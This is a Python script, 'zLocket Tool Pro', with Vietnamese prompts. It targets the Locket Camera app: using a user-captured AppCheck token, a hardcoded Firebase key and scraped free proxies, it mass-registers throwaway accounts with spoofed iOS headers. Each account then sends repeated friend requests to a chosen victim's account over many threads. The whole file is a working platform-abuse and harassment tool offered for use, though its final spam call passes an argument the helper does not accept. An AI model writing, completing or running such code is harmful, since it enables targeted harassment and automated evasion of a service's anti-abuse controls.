import os
import re
import time
import json
import queue
import string
import random
import threading
import datetime
import requests
import urllib3
from queue import Queue
from urllib.parse import urlparse

# Tắt cảnh báo SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Class thay thế colorama để không phải cài thư viện mà vẫn giữ cấu trúc code cũ
class xColor:
    YELLOW = '\033[93m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'

class zLocket:
    def __init__(self):
        self.FIREBASE_GMPID = "1:641029076083:ios:cc8eb46290d69b234fa606"
        self.IOS_BUNDLE_ID = "com.locket.Locket"
        self.API_LOCKET_URL = "https://api.locketcamera.com"
        self.FIREBASE_AUTH_URL = "https://www.googleapis.com/identitytoolkit/v3/relyingparty"
        self.FIREBASE_API_KEY = "AIzaSyCQngaaXQIfJaH0aS2l7REgIjD7nL431So"
        self.SV_FRQ_URL = "https://thanhdieu-server.vercel.app/api/locket-friend-requests"
        self.TOKEN_FILE = "token.json"
        self.TOKEN_EXPIRY_TIME = 1800
        
        self.NAME_TOOL = "zLocket Tool Pro"
        self.TARGET_FRIEND_UID = None
        self.ACCOUNTS_PER_PROXY = random.randint(6, 10)
        self.successful_requests = 0
        self.failed_requests = 0
        
        self.FIREBASE_APP_CHECK = self._load_token()
        self.lock = threading.Lock()

    def _log(self, msg):
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        print(f"[{xColor.CYAN}{timestamp}{xColor.RESET}] {msg}")

    def _load_token(self):
        if os.path.exists(self.TOKEN_FILE):
            with open(self.TOKEN_FILE, 'r') as f:
                data = json.load(f)
                if data.get('expiry', 0) > time.time():
                    self._log(f"{xColor.GREEN}[+] Dùng lại Token AppCheck cũ.")
                    return data['token']
        return self.fetch_token()

    def fetch_token(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{xColor.CYAN}╔═══════════════════════════════════════════════════════╗")
        print(f"{xColor.CYAN}║ {xColor.YELLOW}           YÊU CẦU NHẬP APPCHECK TOKEN                {xColor.CYAN}║")
        print(f"{xColor.CYAN}║ {xColor.WHITE}  (Bắt X-Firebase-AppCheck từ Charles Proxy)          {xColor.CYAN}║")
        print(f"{xColor.CYAN}╚═══════════════════════════════════════════════════════╝")
        token = input(f"\n{xColor.GREEN}Nhập mã token của bạn: {xColor.WHITE}").strip()
        if not token:
            print("Token không được trống!"); exit()
        
        with open(self.TOKEN_FILE, 'w') as f:
            json.dump({'token': token, 'expiry': time.time() + self.TOKEN_EXPIRY_TIME}, f)
        return token

    def headers_locket(self, auth=None):
        h = {
            'Host': 'api.locketcamera.com',
            'X-Firebase-AppCheck': self.FIREBASE_APP_CHECK,
            'Accept-Language': 'vi-VN,vi;q=0.9',
            'User-Agent': 'com.locket.Locket/1.121.1 iPhone/18.2',
            'Content-Type': 'application/json',
        }
        if auth: h['Authorization'] = f"Bearer {auth}"
        return h

    def firebase_headers(self):
        return {
            'Host': 'www.googleapis.com',
            'X-Firebase-AppCheck': self.FIREBASE_APP_CHECK,
            'X-Firebase-GMPID': self.FIREBASE_GMPID,
            'Content-Type': 'application/json',
            'User-Agent': 'FirebaseAuth.iOS/10.23.1 com.locket.Locket/1.121.1'
        }

    def excute(self, url, headers=None, payload=None, proxies=None):
        try:
            res = requests.post(url, headers=headers, json=payload, proxies=proxies, timeout=15, verify=False)
            return res.json() if res.content else True
        except:
            return None

    def _extract_uid(self, url):
        if "invites/" in url: return url.split("invites/")[1][:28]
        try:
            r = requests.get(url, timeout=5)
            match = re.search(r'link=([^&"]+)', r.text)
            if match:
                import urllib.parse
                return urllib.parse.unquote(match.group(1)).split("invites/")[1][:28]
        except: pass
        return None

    def setup(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"[{xColor.GREEN}01{xColor.RESET}] Spam kết bạn")
        print(f"[{xColor.GREEN}02{xColor.RESET}] Thoát")
        choice = input("Chọn: ")
        if choice != "1": exit()
        
        target = input("Nhập link Locket: ").strip()
        self.TARGET_FRIEND_UID = self._extract_uid(target)
        if not self.TARGET_FRIEND_UID: print("Link lỗi!"); exit()
        
        custom_name = input("Nhập tên hiển thị (Custom): ").strip()
        if custom_name: self.NAME_TOOL = custom_name

    def load_proxies(self):
        proxies = []
        if os.path.exists('proxy.txt'):
            with open('proxy.txt', 'r') as f:
                proxies = [l.strip() for l in f if l.strip()]
        
        if not proxies:
            try:
                self._log("Đang tải proxy miễn phí...")
                r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")
                proxies = r.text.splitlines()
            except: pass
        return list(set(proxies))

def worker(tid, q, config, stop_event):
    while not stop_event.is_set() and not q.empty():
        proxy = q.get()
        px_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        
        for _ in range(config.ACCOUNTS_PER_PROXY):
            if stop_event.is_set(): break
            email = "".join(random.choices(string.ascii_lowercase + string.digits, k=12)) + "@gmail.com"
            password = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
            
            # 1. Register
            reg = config.excute(f"{config.API_LOCKET_URL}/createAccountWithEmailPassword", 
                              headers=config.headers_locket(),
                              payload={"data": {"email": email, "password": password, "platform": "ios"}},
                              proxies=px_dict)
            
            if reg and isinstance(reg, dict) and reg.get('result', {}).get('status') == 200:
                # 2. Login
                login = config.excute(f"{config.FIREBASE_AUTH_URL}/verifyPassword?key={config.FIREBASE_API_KEY}",
                                    headers=config.firebase_headers(),
                                    payload={"email": email, "password": password, "returnSecureToken": True},
                                    proxies=px_dict)
                
                token = login.get('idToken') if login else None
                if token:
                    # 3. Profile
                    config.excute(f"{config.API_LOCKET_URL}/finalizeTemporaryUser", 
                                headers=config.headers_locket(token),
                                payload={"data": {"username": "".join(random.choices(string.ascii_lowercase, k=8)), "first_name": config.NAME_TOOL}},
                                proxies=px_dict)
                    
                    # 4. Spam
                    config._log(f"Thread-{tid} | {xColor.GREEN}OK: {email}{xColor.RESET} | Gửi 15 YC...")
                    for _ in range(15):
                        config.excute(f"{config.API_LOCKET_URL}/sendFriendRequest", 
                                    headers=config.headers_locket(token),
                                    json={"data": {"user_uid": config.TARGET_FRIEND_UID, "source": "signUp"}},
                                    proxies=px_dict)
            else:
                break # Proxy lỗi thì đổi

def main():
    config = zLocket()
    config.setup()
    
    proxies = config.load_proxies()
    if not proxies:
        print("Không có proxy!"); return

    q = Queue()
    for p in proxies: q.put(p)
    
    stop_event = threading.Event()
    num_threads = min(len(proxies), 50)
    threads = []
    
    print(f"Khởi chạy {num_threads} luồng...")
    for i in range(num_threads):
        t = threading.Thread(target=worker, args=(i, q, config, stop_event))
        t.start()
        threads.append(t)
        
    try:
        while any(t.is_alive() for t in threads): time.sleep(1)
    except KeyboardInterrupt:
        stop_event.set()
        print("\nĐang dừng...")

    for t in threads: t.join()

if __name__ == "__main__":
    main()
